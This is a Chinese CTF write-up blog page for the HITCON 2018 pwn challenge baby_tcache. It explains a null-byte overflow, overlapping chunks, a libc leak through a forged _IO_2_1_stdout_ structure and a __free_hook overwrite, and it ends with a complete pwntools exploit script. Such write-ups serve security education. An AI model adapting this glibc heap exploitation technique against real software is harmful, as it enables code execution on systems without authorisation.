@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1LiWzcGrrdDOI3gH6EXhQzA提取码：79ui libc2.27 12345678grxer@grxer ~&#x2F;D&#x2F;s&#x2F;c&#x2F;p&#x2F;heap&gt; checksec baby_tcache[*] &amp;#x27;&#x2F;mnt&#x2F;hgfs&#x2F;Share&#x2F;ctfwiki&#x2F;pwn&#x2F;heap&#x2F;baby_tcache&amp;#x27;    Arch:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018 HITCON PWN baby_tcache">
+<meta property="og:url" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/index.html">
+<meta property="og:site_name" content="Computer Security">
+<meta property="og:description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1LiWzcGrrdDOI3gH6EXhQzA提取码：79ui libc2.27 12345678grxer@grxer ~&#x2F;D&#x2F;s&#x2F;c&#x2F;p&#x2F;heap&gt; checksec baby_tcache[*] &amp;#x27;&#x2F;mnt&#x2F;hgfs&#x2F;Share&#x2F;ctfwiki&#x2F;pwn&#x2F;heap&#x2F;baby_tcache&amp;#x27;    Arch:">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419233901431.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234348442.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234533161.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234624496.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234602649.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235740115.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235803167.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000100153.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000346155.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003158991.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003516321.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420001600223.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003955229.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004449167.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004531732.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420005729367.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010052891.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010633032.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010811418.png">
+<meta property="article:published_time" content="2023-04-19T13:02:06.000Z">
+<meta property="article:modified_time" content="2023-04-19T17:09:38.767Z">
+<meta property="article:author" content="Grxer">
+<meta property="article:tag" content="Tcache">
+<meta property="article:tag" content="IO FILE">
+<meta property="article:tag" content="Null Byte Overflow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419233901431.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2018 HITCON PWN baby_tcache</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/04/17/An-interview-question-from-baidu/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&text=2018 HITCON PWN baby_tcache"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&is_video=false&description=2018 HITCON PWN baby_tcache"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2018 HITCON PWN baby_tcache&body=Check out this article: https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&name=2018 HITCON PWN baby_tcache&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&t=2018 HITCON PWN baby_tcache"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunk"><span class="toc-number">1.</span> <span class="toc-text">overlapping chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-2-1-stdout%E5%85%A5%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">IO_2_1_stdout入链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">3.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#freehook"><span class="toc-number">4.</span> <span class="toc-text">freehook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2018 HITCON PWN baby_tcache
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Grxer</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-04-19T13:02:06.000Z" itemprop="datePublished">2023-04-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/IO-FILE/" rel="tag">IO FILE</a>, <a class="tag-link-link" href="/tags/Null-Byte-Overflow/" rel="tag">Null Byte Overflow</a>, <a class="tag-link-link" href="/tags/Tcache/" rel="tag">Tcache</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA">https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA</a><br>提取码：79ui</p>
+<p>libc2.27</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">grxer@grxer ~/D/s/c/p/heap&gt; checksec baby_tcache</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/baby_tcache&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>只有add和delete功能，最多10个chunk，漏洞也很容易找到</p>
+<p>new里的<code> v3[size] = 0;</code>null byte one漏洞</p>
+<p>很容易可以利用去构成overlapping chunk 去做freehook就行了，但是程序没有输出，怎么泄露libc呢</p>
+<p>输出函数只有printf和puts，printf在IOFILE里分析过了看下puts把</p>
+<p><code>libio/ioputs.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>熟悉的_IO_sputn调用，fwrite的主要函数，最终会输出<code>_IO_2_1_stdout_</code>中_IO_write_base~IO_write_ptr之间的内容，虽然程序用setvbuf关了缓冲区，但是setvbuf是打开_IO_2_1_stdout_的flag低两个bit来关闭缓冲区的，如果我们可以控制底层的flag，还怕这个?</p>
+<p>思路把_IO_2_1_stdout_链入bin伪造一波，获取libc，利用overlapping做freehook</p>
+<h3 id="overlapping-chunk"><a href="#overlapping-chunk" class="headerlink" title="overlapping chunk"></a>overlapping chunk</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 //防止0和5合并时，和topchunk合并</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+<p>申请了6个堆</p>
+<img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419233901431.png" alt="image-20230419233901431" style="zoom:80%;">
+
+<p>想让堆5做先前合并到0，就需要修改堆5的prevsize和previnuse位，</p>
+<p>释放堆5时要制造前面所有堆块是一个大堆块且free状态的假象，prevsize&#x3D;0x500+0x40+0x50+0x60+0x70&#x3D;0x660</p>
+<p>释放4再申请0x68拿回来原来的chunk，由于空间复用和null byte overflow 可以修改堆5的prevsize和previnuse位</p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234348442.png" alt="image-20230419234348442"></p>
+<p>释放0再释放5构成unlink，导致overlapping</p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234533161.png" alt="image-20230419234533161"></p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234624496.png" alt="image-20230419234624496"></p>
+<p>大小为0x660+0x500&#x3D;0xB60符合预期</p>
+<p>同时把堆2放入bin里为下一步做准备</p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234602649.png" alt="image-20230419234602649"></p>
+<h3 id="IO-2-1-stdout入链"><a href="#IO-2-1-stdout入链" class="headerlink" title="IO_2_1_stdout入链"></a>IO_2_1_stdout入链</h3><p>我们可以切割unsortedbin来让在tcachebin的堆2的fd指向unsortedbin，</p>
+<p>切割大小为0x500+0x40，减去chunkhead为0x530大小</p>
+<p>add(0x530)</p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235740115.png" alt="image-20230419235740115"></p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235803167.png" alt="image-20230419235803167"></p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000100153.png" alt="image-20230420000100153"></p>
+<p>申请出来尾号1790的chunk，把他的fd低两个字节改掉就可以入链</p>
+<p><code>add(0xa0, b&#39;\x60\xc7&#39;)</code></p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000346155.png" alt="image-20230420000346155"></p>
+<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>拿出来stdout进行伪造</p>
+<p>flag需要满足</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure>
+
+<p>即flag&#x3D;0xFBAD1800</p>
+<p><code>add(0x40)</code></p>
+<p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code></p>
+<p>为什么会是3f这么奇怪的数字而不是直接0x40大小，应为我们程序会v3[size] &#x3D; 0;会在申请到的堆0x7ffff7bec760+size位置零，在stdout的IO_FILE结构体里随便置零极有可能导致程序crash掉</p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003158991.png" alt="image-20230420003158991"></p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003516321.png" alt="image-20230420003516321"></p>
+<p>所以我们选择了一块本来就是零的地方，0x3e 0x3f 0x47 0x48都可以</p>
+<p>修改前</p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420001600223.png" alt="image-20230420001600223"></p>
+<p>修改后</p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003955229.png" alt="image-20230420003955229"></p>
+<p>下次输出菜单时即可泄露地址</p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004449167.png" alt="image-20230420004449167"></p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004531732.png" alt="image-20230420004531732"></p>
+<h3 id="freehook"><a href="#freehook" class="headerlink" title="freehook"></a>freehook</h3><p>这个时候我们看下unsortbin</p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420005729367.png" alt="image-20230420005729367"></p>
+<p>哟，这不是我们的堆4吗，如果我们在前面</p>
+<p><code>add(0x40)</code></p>
+<p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code>的时候释放掉chunk4时，不就可以把chunk4放入tcache吗</p>
+<p><code>delete(4) add(0x530) add(0xa0, b&#39;\x60\xc7&#39;)</code></p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010052891.png" alt="image-20230420010052891"></p>
+<p>两次申请freehook里写入onegadget即可</p>
+<p><code>add(0x60,p64(libcelf.symbols[&#39;__free_hook&#39;]))</code></p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010633032.png" alt="image-20230420010633032"></p>
+<p><code>add(0x60) add(0x60,p64(onegadget))</code></p>
+<p><code>delete(0)</code></p>
+<p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010811418.png" alt="image-20230420010811418"></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./baby_tcache&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=ELF(<span class="string">&#x27;/mnt/hgfs/Share/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&#x27;x&#x27;</span></span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;Data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 </span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment"># db(&#x27;b malloc&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0D83)&#x27;)</span></span><br><span class="line">add(<span class="number">0x48</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">66</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">libc=uu64(r(<span class="number">6</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">libcelf.address=libc</span><br><span class="line">onegadget=libc+<span class="number">0x4f302</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0xa0</span>,p64(libcelf.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
